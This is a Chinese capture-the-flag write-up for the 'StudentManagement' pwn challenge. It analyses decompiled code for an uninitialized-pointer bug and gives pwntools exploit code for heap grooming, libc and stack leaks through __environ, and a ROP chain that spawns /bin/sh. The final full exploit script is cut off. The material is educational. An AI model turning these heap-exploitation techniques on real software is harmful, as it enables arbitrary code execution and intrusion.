---
title: 第二届软件系统安全赛决赛 StudentManagement 详解
url: https://mp.weixin.qq.com/s/n4QTpIX7rOEa71snqLMXGg
source: Doonsec's feed
date: 2026-07-11
fetch_date: 2026-07-12T05:07:47.512804
---

# 第二届软件系统安全赛决赛 StudentManagement 详解

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K2yqPBiaa6lbFSVNiar4BCia6BpY5l7niaRibfhjxuIdiaT8Qe3PIaJBSdVCia5gCUuBqVVHuKmtq9II9HRv3rbTrlicybyga6tMPH3DvE/0?wx_fmt=jpeg)

# 第二届软件系统安全赛决赛 StudentManagement 详解

S1nyer
S1nyer

看雪学苑

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 程序保护如下：

```
[*] '/mnt/hgfs/shared/ccsssc_final/StudentManagement/pwn'
Arch:amd64-64-little
RELRO:Full RELRO
Stack:Canary found
NX:NX enabled
PIE:PIE enabled
```

glibc 版本是 `2.39-0ubuntu8.7`

比赛的时候脑子有点乱，虽然很快审计出了`uninitialized memory`漏洞，但是因为题目的`\0`截断以及非传统堆题的交互，让我不知道怎么处理。

赛后再看，其实这题本质和传统堆题没区别：没有限制用户数量，所以可以创建任意多的堆块且大小基本可控（<0x400）。

**程序分析**

题目是一个学生管理系统，主菜单只有 3 个功能：

* `Reg`
* `Login`
* `Del`

登录后则有：

* `View`
* `EditBio`
* `Logout`

先贴几个关键逻辑的简化版伪代码，`user`结构体如下：

```
struct user
{
char id[16];
char name[64];
char pass[32];
uint8_t *cont;
size_t size;
  user *next;
};
```

**register**

```
voidregister(){
  user *buf; // [rsp+8h] [rbp-8h]

  buf = (user *)ialloc(0x88u);
if ( buf )
  {
puts("\n=== Registration ===");
printf("ID: ");
    buf->id[read(0, buf, 0xFu)] = 0;
if ( find(buf->id) )
    {
puts("[-] ID exists");
free(buf);
    }
else
    {
printf("Name: ");
      buf->name[read(0, buf->name, 0x3Fu)] = 0;
printf("Pass: ");
      buf->pass[read(0, buf->pass, 0x1Fu)] = 0;
      buf->next = userhead;
      userhead = buf;
    }
  }
}
```

这里已经能看到问题了，`malloc(0x88)` 之后只写了`id\name\pass\next`，但是`cont\size`完全没有初始化。

**view**

```
voidshow(user *a1){
puts("\n=== Profile ===");
printf("Name: %s\nID: %s\n", a1->name, a1->id);
if ( a1->cont )
printf("Bio: %s\n", (constchar *)a1->cont);
}
```

这里更致命，程序只判断了 `u->cont != NULL`，然后就直接把它当字符串打印。

如果 `cont` 是个悬空指针，那就是 UAF read

如果 `cont` 被我们伪造成任意地址，那就是任意地址读

**edit bio**

```
unsigned __int64 __fastcall editbio(user *a1){
uint8_t *cont; // rbx
int v3; // [rsp+14h] [rbp-1Ch] BYREF
unsigned __int64 v4; // [rsp+18h] [rbp-18h]

  v4 = __readfsqword(0x28u);
printf("\nNew bio size: ");
  __isoc99_scanf("%d", &v3);
getchar();
if ( v3 > 0 && v3 <= 0x400 )
  {
if ( a1->cont && a1->size < v3 )
    {
free(a1->cont);
      a1->cont = (uint8_t *)ialloc(v3);
      a1->size = v3;
    }
else if ( !a1->cont )
    {
      a1->cont = (uint8_t *)ialloc(v3);
      a1->size = v3;
    }
printf("Content: ");
    cont = a1->cont;
    cont[read(0, cont, v3 - 1)] = 0;
  }
return v4 - __readfsqword(0x28u);
}
```

`edit` 函数这里

* 如果 `cont` 非空且 `size >= n`，就直接往 `cont` 写
* 如果 `cont` 非空但 `size < n`，就先 `free(cont)` 再 `malloc(n)`

**delete**

```
    __isoc99_scanf("%d", &s);
    getchar();
if ( s == 3 )
    {
printf("\nID to delete: ");
      buf[read(0, buf, 0xFu)] = 0;
      p_next = &userhead;
      ptr = 0;
while ( *p_next )
      {
if ( !strcmp((*p_next)->id, buf) )
        {
          ptr = *p_next;
          *p_next = ptr->next;
if ( ptr->cont )
          {
            free(ptr->cont);
            ptr->cont = 0;
          }
          free(ptr);
printf("[+] Student %s deleted\n", buf);
break;
        }
        p_next = &(*p_next)->next;
      }
if ( !ptr )
        puts("[-] Not found");
    }
```

##

**漏洞利用**

### Step1 堆风水&泄露堆地址

先说思路，整个堆利用过程如下

* 先造一个 `0x110` 的 unsorted chunk
* 再把这个 unsorted chunk 切成几块 `0x70`
* 让切出来的小块进 fastbin
* 再用一次大申请触发 `malloc_consolidate`
* 等这些零散小块重新合并回 unsorted 之后，再去申请 `0x90 user`

这样 `victim` 就不会从“被清过 `cont` 的旧 user chunk”里出来，而是会从 **重新合并后的 unsorted** 里切出来，之前布好的脏数据也就正好落到了 `victim->cont` 的位置上。

下面按 exp 的顺序细讲

先用 7 个 filler 把 `0x110` 档 chunk 填满，再额外做一个 `aaa`：

```
for i in range(7):
reg(f"fil{i}", i, i)
login(f"fil{i}", i)
edit(b"aaaa", 0x100)
logout()

reg("aaa", "aaa", "aaa")
login("aaa", "aaa")
edit("aaaa", 0x100)
logout()
```

然后放两个占位用户 `ph1/ph2`：

```
reg("ph1", "ph1", "ph1")
reg("ph2", "ph2", "ph2")
```

接着删掉前面 7 个 filler：

```
for i in range(7):
dele(f"fil{i}")
```

这样：

* `0x90 tcache`

  里是 7 个旧 `user` chunk
* `0x110 tcache`

  里是 7 个旧 `bio` chunk

注意这里虽然 `0x90 tcache` 里有 7 个旧 user，但这些 chunk 不是待会儿的 leak 核心，因为 delete 已经把 `cont` 清零了。

再把这 7 个 filler 注册回来：

```
for i in range(7):
reg(f"fil{i}", i, i)
login(f"fil{i}", i)
edit(b"aaaa", 0x60)
logout()
```

这里的目的也不是用这些 filler 做 UAF write，而是给它们重新挂上 `0x60` 的 bio，等会儿删掉时把 `0x70 tcache` 填满。

也就是说，这 7 次 `edit(..., 0x60)` 是在准备 `0x70` 这一档的堆布局：

```
login("aaa", "aaa")
edit("aaaa", 0x108)
logout()

login("ph1", "ph1")
edit("aaaa", 0x68)
logout()

login("ph2", "ph2")
edit("aaaa", 0x68)
logout()

for i in range(7):
dele(f"fil{i}")

login("ph1", "ph1")
edit("aaaa", 0x70)
logout()

login("ph2", "ph2")
edit("aaaa", 0x70)
logout()

for i in range(7):
reg(f"fil{i}", i, i)

login("ph2", "ph2")
edit("aaaa", 0x400) # trigger malloc_consolidate
logout()
```

这一坨看起来乱，其实目的很单纯：

* `aaa`

  的 `0x100 -> 0x108` 会把旧的 `0x110` bio 丢进 unsortedbin
* `ph1/ph2`

  的两次 `0x68` 申请，会从这块 unsorted 上切出两个 `0x70` chunk
* 删除 7 个 filler 后，`0x70 tcache` 被填满
* 这时 `ph1/ph2` 再做 `0x68 -> 0x70` 扩容，旧 `0x70` chunk 因为 tcache 已满，不会进 tcache，而是会进 fastbin
* 重新注册 7 个 filler，则是为了**吃光 `0x90 tcache` 里那些 cont 已被清零的 user chunk**
* 最后 `ph2` 申请 `0x400`，触发 `malloc_consolidate`，前面那两块 fastbin 小块会被重新合并并送回 unsortedbin

这一步就是整个 Step1 的关键，如果不先把 `0x90 tcache` 清空，后面 `victim` 注册时拿到的只会是 delete 过、`cont == NULL` 的旧 user chunk，根本 leak 不出来。

而只要 `0x90 tcache` 被提前吃光，`victim` 的 `malloc(0x88)` 就会转去从刚刚重新合并出来的 unsorted 里切 `0x90`，这时之前布好的脏数据才会准确落到 `victim->cont/size` 的偏移上。

等这套风水搭完以后，再注册一个新用户：

```
reg("victim", "vic", "vic")
login("victim", "vic")
show()
ru("Bio: ")
heapbase = uheap() - 0x18d0
logout()
```

此时 `victim` 不是从旧 user tcache 出来的，而是从重新合并后的 unsorted 上切出来的。

也正因为如此，它的未初始化 `cont` 字段拿到的不是 `NULL`，而是我们前面通过切割/合并布好的堆上脏数据。

`show()` 会直接把对应位置的堆数据吐出来，减掉固定偏移就能拿到 `heap base。`

接下来的工作就很简单了。

### Step2 泄露libc地址

接下来用 `ph1` 伪造一个 `user` 对象，先把 libc 基址泄露出来。

所以我可以先把一个 `0x90` chunk 当作 `ph1` 的 bio 拿到手，然后按 `user` 结构布局往里面写内容。

```
login("ph1", "ph1")
payload = flat({0x70:p64(heapbase + 0xf20) + p64(0x100)}, filler = b"\x00")
edit(payload, 0x88)
logout()
```

这里写的是 `user` 的后半段：

```
+0x70 -> cont = heapbase + 0xf20
+0x78 -> size = 0x100
```

也就是说，等这块 `0x90` chunk 以后重新作为 `user` 被 `register` 取出来时，这个新用户天然就会变成：

```
victim->cont = heapbase + 0xf20;
victim->size = 0x100;
```

然后把这块伪造好的 `0x90` bio 再 free 回去：

```
reg("pad", "pad", "pad")
login("ph1", "ph1")
edit("aaaa", 0x90)
logout()
```

接着注册 `vic`：

```
reg("vic", "vic", "vic")
login("vic", "vic")
show()
ru("Bio: ")
libcbase = uu64() - 0x203b90
logout()
```

`vic->cont` 已经被我们提前埋成了 `heapbase + 0xf20`，这里对应位置存的是 unsortedbin 残留指针，所以直接把 libc 地址读了出来。

### Step3 泄露栈地址

有了 libc 以后，下一步就是照抄刚才那套“伪造 future user”的打法，把 `cont` 指到 `__environ`，把栈地址捞出来。

先把前一个伪造用户和 `ph1` 清掉，腾出 `0x90` bin：

```
dele("vic")
dele("ph1")
reg("ph1", "ph1", "ph1")
```

然后重新用 `ph1` 申请 `0x88` 大小 bio，把 future user 的 `cont` 伪造成 `__environ`：

```
login("ph1", "ph1")
payload = flat({0x70:p64(libc.sym["__environ"]) + p64(0x100)}, filler = b"\x00")
edit(payload, 0x88)
edit("aaaa", 0x90)
logout()
```

再次注册 `vic` 并查看：

```
reg("vic", "vic", "vic")
login("vic", "vic")
show()
ru("Bio: ")
stack = uu64() - 0x180
logout()
```

这里泄露出来的是 `__environ`，再减去调试得到的固定偏移，就拿到了这次要写的返回地址位置。

### Step4 ret2libc

最后一步就很直白了：继续伪造一个 future user，把它的 `cont` 直接改成要写的栈地址，然后往上面塞 ROP。

还是老规矩，先找一个用户来拿 `0x90` bio：

```
reg("ph3", "ph3", "ph3")
login("ph3", "ph3")
payload = flat({0x70:p64(stack) + p64(0x210)}, filler = b"\x00")
edit(payload, 0x88)
edit("aaaa", 0x90)
logout()
```

这里 future user 的字段变成：

```
cont = stack;
size = 0x210;
```

构造 ROP链：

```
rop = ROP(libc)
rop.raw(libc.search(asm("ret"), executable=True).__next__())
rop.call("system", [libc.search("/bin/sh\x00").__next__()])
```

最后注册 `vic2`，登录后把 ROP 直接写进栈里：

```
reg("vic2", "vic2", "vic2")
login("vic2", "vic2")
edit(rop.chain(), 0x200)
logout()
```

![图片描述](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Cpo2XCpI7K2F3WQLTMWsDFlu2cE0HgU4BR9AXTkcbqXs3GhaZCWamo6GTX0BUpcViaaz10svnwUIvlxRp41yoKY0vsXofHV9zcgJdz94deHY/640?wx_fmt=other&from=appmsg)

##

**完整EXP**

```
from pwn import *
import struct

def debug(c = 0):
if(c):
        gdb.attach(p, c)
else:
        gdb.attach(p)

sd = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data: p.sendl...